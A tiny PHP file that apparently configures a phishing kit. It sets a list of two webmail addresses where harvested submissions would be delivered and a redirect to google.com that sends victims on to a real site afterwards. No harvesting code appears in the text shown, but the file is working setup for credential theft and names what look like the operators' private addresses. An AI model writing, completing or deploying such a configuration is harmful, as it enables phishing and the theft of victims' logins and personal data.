<?php 
$Receive_email="younger8122@yandex.com,amyg81234@gmail.com";
$redirect="https://www.google.com/";
?>